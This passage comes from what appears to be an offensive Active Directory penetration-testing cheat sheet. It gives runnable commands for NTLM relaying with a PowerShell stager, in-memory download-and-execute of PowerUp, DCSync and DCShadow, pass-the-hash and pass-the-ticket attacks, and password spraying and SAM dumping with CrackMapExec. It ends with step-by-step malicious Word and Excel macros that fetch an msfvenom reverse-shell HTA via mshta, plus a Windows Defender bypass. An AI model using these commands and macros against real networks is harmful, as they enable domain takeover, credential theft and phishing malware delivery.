sudo ./Responder.py -i eth0 -rdwv
```

3. Now we will use NTLMRelayX from Impacket to forward the challenge to the tricked server and the NTLMv2 hash to the target server

```bash
python ntlmrelayx.py -tf targets.txt -smb2support
```

4. We can also get a shell by using NTLMRelayX. First we will have to setup a listener and create a powershell stager with Empire. Once we have that, we can use NTLMRelayX to get a shell

```bash
python ntlmrelayx.py -tf target.txt -smb2support -c "POWERSHELL STAGER"
```

# BloodHound

The best tool to enumerate and discover ways to attack a forest. Lets us visualize data using a graphical DBMS known as neo4j. It is not a stealthy tool

First we'll have to start the neo4j database server

```bash
sudo neo4j console
```

Open your web browser and navigate to `localhost:7474`. In the `Connect URL` field, change the method from `neo4j://` to `bolt://` and in the username and password fields, type `neo4j` and click on `Connect`. Now type in a new password and click on `Change password`. Close your web browser

Start BloodHound 

```bash
bloodhound
```

Enter the username as `neo4j` and the password as the new password you set. Enable `Save Password` so you do not have to always login 

To gather data about the forest we will have to use the collector on a compromised computer which is a part of a domain. We can either run the collector remotely which will connect to the compromised machine, collect the data and save a zip file on our machine or on the compromised machine itself which will generate a zip file on the compromised machine which we will have to transfer to our machine. If we run the collector on the compromised machine, it will generate more accurate results

If we are running it on the compromised machine, we will use the `SharpHound` collector

```md
SharpHound.exe -c ALL
```

OR

```powershell
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
```

If we are gonna run the collector remotely, we will use the `bloodhound-python` collector. Note: This can only enumerate 1 domain

```md
sudo pip3 install bloodhound
bloodhound-python -u svc_admin -p password123 -d active.local -dc 10.10.10.100 -c ALL
```

Here, `svc_admin` is the username of the compromised account, `password123` is the password of the compromised account,  `active.local`  is the domain and `10.10.10.100` is the IP of the DC 

Once the collectors have collected the data and saved it to a zip file, we can just drag and drop it into bloodhound which will easily let us visualize and view the data 

# PowerUp 

Powerup is a powershell script which will check for privilege escalation vectors such as writable service path, unquoted service path, alwaysinstallelevated, etc

```powershell
IEX(New-Object Net.WebClient).DownloadString ("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1") #Download and Execute in RAM
Invoke-AllChecks
```

Now it will display all the privilege escalation vectors and the way to abuse it. To abuse the vulnerability, simply copy and paste the command next to `AbuseFunction` 

# Replication Attacks

## DCSync

DCSync attack is an attack in which a user has replication rights and so it simulates a DC to replicate the database from the DC to our computer

To simulate a DC and replicate the database, the Microsoft Directory Replication Service Remote Protocol (MS-DRSR) is used

By default, domains admins , enterprise admins, members of domain controller groups have replication rights. However, other users can be given the rights

To check for a DCSync attack, we will need valid credentials of a user which has permissions to replicate the database. Once we do, we can run sharphound and then analyse the loot with bloodhound

The attack allows a attacker's computer to ask the domain controller to replicate the database, using the GetNCChanges method of the MS-DRSR protocol (Like GET is a method of HTTP) and send it to the attacker

To perform a DCSync attack, we will use secretsdump.py from Impacket

```bash
secretsdump.py -outfile dcsync active.local/backup:'mypass123'@10.10.10.100 -just-dc
```

Here,  `active.local`  is the domain name,  `10.10.10.100`  is the IP of the DC, `backup` is the account which has replication permissions and `mypass123` is the password of the backup account

## DCShadow

Post exploitation attack which we perform when we are a domain admin. Stealthy 

In this attack, an attacker registers a compromised computer in the domain as a domain controller by changing the values of it's SPN. The attacker can make changes to the AD database and replicate them to the other DCs

We will use mimikatz to perform this attack

## Setup

```txt
C:\Temp > mimikatz.exe
mimikatz # !+ 
mimikatz # !processtoken
```

The above commands will start the mimidrv service and elevate our privileges by getting a privileged token 

In windows, programs can run in 2 modes:

1. Kernel Mode -> The program has direct and unrestricted access to the hardware and can use any number of resources. No middle man (OS) is involved. All processes in this mode will share the same memory address
2. User Mode -> The program can access the hardware via the OS. The OS allocates the resources to the program. All processes in this mode have different memory addresses

In windows, drivers are allowed to run in kernel mode. Mimidrv is a driver which can be used to escalate from user mode to kernel mode and run commands in kernel mode. Lets us bypass/deactivate security features such as LSA

Drivers are software which are used by the OS/application software to communicate with and control hardware

Every process has a token associated with it which defines the user which is running that process. Using  `!processtoken`  we can duplicate the process token of a privileged user  to an attacker-controlled process. In this case, mimikatz would duplicate the process token of a process being run by  `NT AUTHORITY\SYSTEM`  to the mimikatz process and cmd process

Now we can check which process token is associated with the mimikatz process

```txt
mimikatz # token::whoami
```

### Adding a domain user to Domain Admins group

To start a rogue domain controller we can run the following command. We should also specify the changes we are going to replicate to the other DCs

```txt
mimikatz # lsadump::dcshadow /object:arav /attribute:primaryGroupID /value:512
```

To register our computer as a valid one and replicate the changes to the database in the other DCs, run the following command in a new terminal window

```txt
C:\Temp > mimikatz.exe
mimikatz # lsadump::dcshadow /push
```

Now if we check our user information, we will see that we are a part of the Domain Admins group

```powershell
net user arav /domain
```


# Passing Attacks

## Pass the Hash

If we have been able to grab the NTLM hash of a user, then instead of cracking it, we can send the NT hash to authenticate and gain access

Note: This will not work with NTLMv1/v2 hashes i.e. hashes used to authenticate to services which we captured by an attack such as LLMNR poisoning. These hashes are typically the ones which we can dump from the SAM database/NTDS.dit

This works because the challenge is encrypted with the user's NT hash and not the cleartext password

This is the structure of an NTLM hash from the SAM database

```txt
Username:RID:LM Hash:NT Hash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0d
```

The LM hash is set to `aad3b435b51404eeaad3b435b51404ee` which means it is empty

We would have to pass the NT hash which would be `a9fdfa038c4b75ebc76dc855dd74f0d` for the admin

These are some examples of passing the hash

```txt
evil-winrm -i 10.10.10.100 -u Administrator -H a9fdfa038c4b75ebc76dc855dd74f0d -> Powershell Remoting
xfreerdp /u:Administrator /pth:a9fdfa038c4b75ebc76dc855dd74f0d /v:10.10.10.100 -> RDP Server
crackmapexec smb 10.10.10.100 -u Administrator -H a9fdfa038c4b75ebc76dc855dd74f0d -x 'whoami' -> SMB Server
```

Some tools such as PsExec, WMIExec and the Impacket Tools require us to pass the entire NTLM hash i.e. LM Hash:NT Hash. If we do not have an LM Hash, simply use 32 0s as the LM Hash

```bash
python psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0d Administrator@10.10.10.100
python wmiexec.py -hashes 00000000000000000000000000000000:a9fdfa038c4b75ebc76dc855dd74f0d Administrator@10.10.10.100
python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0d active.local/Administrator@10.10.10.100
```

## Pass the Ticket

In this attack, we extract a TGT/TGS which is stored in the memory of a compromised computer and use it to access other resources

Passing of the ticket refers to using it to access a resource

If it is a TGS, we can access that service instance by using it

If it is a TGT, we can access any service instance. The computer would send a TGS-REQ to the KDC and get the TGS for the SPN

1. First we need to extract the tickets from the memory of the compromised computer. This can be done with mimikatz

```txt
.\mimikatz.exe
mimikatz # kerberos::list /export
```

2. Now we can use the ticket(s) in an active session by passing it

```txt
mimikatz # kerberos::ptt ticket.kirbi 
mimikatz # misc::cmd
```

3. Now that we have the ticket, we can access other resources in the domain

```powershell
net use D: \\dc.active.local\secretShare # Mount a file share from the domain controller

sqlcmd -S dbserver.active.local # Connecting to an MSSQL instance on the database server
1> SELECT HOST_NAME, SELECT SYSTEM_USERl;
2> GO

PsExec64.exe \\secretServer.active.local cmd.exe # Accessing the SMB service and execute commands via psexec
```

## Overpass the Hash

Combination of pass the hash and pass the ticket

In this attack, we use an NT hash to request for Kerberos tickets 

Since in an AS-REQ, the timestamp is encrypted with the user's NT hash and not their password, we can use the NT hash to get a TGT and then a TGS to access any service

We can perform this with Rubeus 

```powershell
.\Rubeus.exe asktgt /domain:active.local /user:arav /rc4:5012dd2ebd71a467f0cd8dddbe98e042 /ptt
```

Here,  `active.local`  is the domain, `arav` is the user who's NT hash we have and `5012dd2ebd71a467f0cd8dddbe98e042` is their NT hash

This would request the KDC for a TGT and then load it into memory

We can now any service by requesting its TGS

```powershell
net use D: \\dc.active.local\secretShare # Mount a file share from the domain controller

sqlcmd -S dbserver.active.local # Connecting to an MSSQL instance on the database server
1> SELECT HOST_NAME, SELECT SYSTEM_USERl;
2> GO

PsExec64.exe \\secretServer.active.local cmd.exe # Accessing the SMB service and execute commands via psexec
```

# CrackMapExec
 
Swiss army knife of AD pentesting and is used for password/hash spraying and bruteforcing

If we see `Pwn3d!`  in the output, it means that the credentials we have are for an admin account

## SMB

### Spraying 

```bash
crackmapexec smb 10.10.10.100 -u /root/Desktop/user.txt -p mypass123
crackmapexec smb 10.10.10.0/24 -u Administrator -p mypassword123
crackmapexec smb 10.10.10.0/24 -u Administrator -H a9fdfa038c4b75ebc76dc855dd74f0d
```

### Dictionary Attack

```bash
crackmapexec smb 10.10.10.100 -u /root/Desktop/user.txt -p /root/Desktop/pass.txt
```

### Listing shares

```bash
crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'mypass123' --shares
```

### Listing drives

```bash
crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'mypass123' --disks
```

### Enumerating users

```bash
crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'mypass123' --users
```

### Enumerating groups

```bash
crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'mypass123' --groups
```

### Passing a hash

```bash
crackmapexec smb 10.10.10.100 -u 'Administrator' -H 'a9fdfa038c4b75ebc76dc855dd74f0d'
```

### Dumping the SAM file

```bash
crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'mypass123' --sam
```

### Executing commands

Will only work if we have credentials for an admin account

```bash
crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'mypass123' -x "whoami && dir"
```

### Listing modules

```bash
crackampexec smb -L
```

### Running a module

All modules can be found [here](https://www.infosecmatter.com/crackmapexec-module-library/)

```bash
crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'mypass123' -M <Module>
```

Some modules are:

1. bloodhound
2. rdp
3. web_delivery
4. mimikatz
5. met_inject
6. gpp_password
7. Get-ComputerDetails

### Specifying module options

```bash
crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'mypass123' -M <Module> -O "<Options>"
```

# LDAP

Lightweight Directory Access Protocol

Used to fetch information from the AD database

Also used to modify information in the database

Lets us remotely view the objects and their attributes in the domain

Views and fetches details of objects from the `Attribute Editor` of each object

An LDAP server listens on ports 389 (Cleartext) and 636 (Over SSL)



#  RPC

Remote Procedure Call

Protocol which lets a program use the service of another program on another computer in the network without knowing the information of that network

Layer 5 protocol

Port: 111 (TCP) on Linux and 135 (TCP) on Windows

### Connecting to the RPC server

```bash
rpcclient -U admin%password123 10.10.10.100
```

### OS and Server info

```bash
rpcclient $> srvinfo
```

### Domain information

```bash
rpcclient $> querydominfo
```

### Domain users

```bash
rpcclient $> enumdomusers
```

### Domain groups

```bash
rpcclient $> enumdomgroups
```

### Specific user information

```bash
rpcclient $> queryuser myUser
```

### Specific group information

```bash
rpcclient $> queryuser 0x200
```

0x200 -> RID of the group

### Privileges

```bash
rpcclient $> enumprivs
```

### Creating domain user

```bash
rpcclient $> createdomuser newUser
```

### Creating a domain group

```bash
rpcclient $> createdomgroup myGroup123
```

### File shares 

```bash
rpcclient $> netshareenum (Wont show hidden shares)
rpcclient $> netshareenum (Will show all shares including hidden ones)
```

### Specific file share information

```bash
rpcclient $> netsharegetinfo myshare
```

# Creating malicious documents

## Basics of Visual Basic Scripting

### Displaying a message

```vb
MsgBox("Hello World!") (One value)
MsgBox("Hello",1,"Idk") (Multiple values)
MsgBox(a,b,c) (Variables)
```

### Variables

```vb
Dim <Name> as <Type>
<Name> = <Value>
```

Important data types in vb are: 

* Byte
* Integer
* Double
* Long
* Date
* String

```vb
Dim a as Byte
a = 20
Dim b as Integer
b = 1037
Dim c as Double
c = 194.37842
Dim d as Long
d = 4676376
Dim e as Date
e = "2/10/2021"
Dim f as String
f = "hello world!"
```

Note: Variables can be created without specifying data types if they are calling a function

#### Declaring variables in 1 line

```vb
Dim a as Byte, b as Integer, c as Double
```

#### Concatenating variables

```vb
Dim str1 as String, str2 as String, str3 as String
str1 "Hello "
str2 = "World"
str3 = str1 & str2

Dim str1 as String
str1 = "Hello " & "World!"

Dim str1 as String, num as Integer

num = 10
str1 = "Number = " & num	

Dim str1 as String, str2 as String, str3 as String
str1 "Hello "
str2 = "World"
str3 = str1 + str2
```

### Sub procedures

These are basically functions without  a return type and can be called without a keyword

```vb
Sub test()

	STATEMENTS

End Sub
```

#### Parameterized sub procedures

```vb
Sub test(a as Integer, b as String)

	STATEMENTS

End Sub
```

#### Calling a sub procedure

```vb 
Sub Main()
	test 1 "Hello"
End Sub

Sub test(a as Integer, b as String)

	MsgBox(a,b)

End Sub
```

Some special sub procedure names which have some meaning are 

-   AutoExec runs when you start Word or load a global template
-   AutoNew runs when you create a new document
-   AutoOpen runs when you open the document
-   AutoClose runs when you close the document
-   AutoExit runs when you exit Word or unload a global template
-   Document_Open runs when a document is opened
-   Document_Close runs when a document is closed
-   Document_New runs when a new document based on the template is created

### Executing shell commands

#### Normally executing commands

```vb 
<Variable> = Shell("COMMAND")
c = Shell("cmd")
chrm = Shell("chrome https://google.com")
```

#### Using an object of the WScript class

```vb
Set sh = CreateObject("WScript.Shell")
Set shExec = sh.Exec("whoami")
MsgBox(shExec.StdOut.ReadAll)
```

The above code may get detected by Windows Defender as Office is not allowed to run child processes 

To bypass this, we can create a child process using Outlook

```vb
Set OL = createObject("Outlook.Application")
Set sh = OL.CreateObject("WScript.Shell")
Set shExec = sh.Exec("whoami")
MsgBox(shExec.StdOut.ReadAll)
```

## Setting up

* First lets create a malicious HTA script using MSFVenom

```bash
mkdir www
cd www
msfvenom -p windows/meterpreter/reverse_tcp LHOST 10.10.10.6 LPORT 4444 -f hta > myapp.hta
```

Here,  `10.10.10.6`  is our IP, `4444` is the port on which we will listen and  `myapp.hta`  is the malicious HTA payload

* Once the file is generated, start a python HTTP server

```bash
python3 -m http.server
```

* After running the web server, run a netcat listener on port 4444

```bash
nc -lnvp 4444
```

## Creating a malicious Word document

### Manual way 

In this case, we will create a sub procedure named `AutoOpen` which will run the macro when the document is opened and another sub procedure containing the shell function which will run a malicious HTA script

* Open MS Word and create a new document
* Press the `Alt` key and then the `W` key which will take you to the view section
* On the right, you should see a button named `Macros`. Click on it 
* In the new window, provide a name for your macro and click on `Create`
* This will open the visual basic editor. Replace the existing code with the code below

```vb
Sub mymacro()
	sh = Shell("mshta.exe http://10.10.10.6:8000/myapp.hta")
End Sub

Sub AutoOpen()
	mymacro
End Sub
```

Here,  `10.10.10.6`  is our IP,  `8000`  is the port on which the python web server is listening and  `myapp.hta`  is the malicious HTA payload

In the code above, we are creating 2 sub procedures. The first one named `mymacro` will run a malicious HTA script. The second one named `AutoOpen` is a special name given to the sub procedure which will make the macro run when the word document is opened. 

* Finally press `Ctrl+S` to save the document with the macros

### Automating the process with Nishang

Nishang has a script named `Out-Word.ps1` which can automate the above

```powershell
wget https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-Word.ps1 -OutFile Out-Word.ps1
. .\Out-Word.ps1
Out-Word -Payload "mshta.exe http://10.10.10.6:8000/myapp.hta" -OutFile Document.doc
```

Here,  `10.10.10.6`  is our IP,  `8000`  is the port on which the python web server is listening and  `myapp.hta`  is the malicious HTA payload

## Creating a malicious excel spreadsheet

In this case, we will create a sub procedure named `Auto_Open` which will run the macro when the spreadsheet is opened and another sub procedure containing the shell function which will run a malicious HTA script

* Now that we have everything setup, open MS Excel and create a new spreadsheet
* Press the `Alt` key and then the `W` key which will take you to the view section
* On the right, you should see a button named `Macros`. Click on it 
* In the new window, provide a name for your macro and click on `Create`
* This will open the visual basic editor. Replace the existing code with the code below

```vb
Sub mymacro()
	sh = Shell("mshta.exe http://10.10.10.6:8000/myapp.hta")
End Sub

Sub Auto_Open()
	mymacro
End Sub
```

Here,  `10.10.10.6`  is our IP,  `8000`  is the port on which the python web server is listening and  `myapp.hta`  is the malicious HTA payload

In the code above, we are creating 2 sub procedures. The first one named `mymacro` will run a malicious HTA script. The second one named `Auto_Open` is a special name given to the sub procedure which will make the macro run when the word spreadsheet is opened. 

* Finally press `Ctrl+S` to save the spreadsheet with the macros

### Automating the process with Nishang

Nishang has a script named `Out-Excel.ps1` which can automate the above

```powershell
wget https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-Excel.ps1 -OutFile Out-Excel.ps1
. .\Out-Excel.ps1
Out-Excel -Payload "mshta.exe http://10.10.10.6:8000/myapp.hta" -OutFile Spreadsheet.xlsx
```

Here,  `10.10.10.6`  is our IP,  `8000`  is the port on which the python web server is listening and  `myapp.hta`  is the malicious HTA payload

***
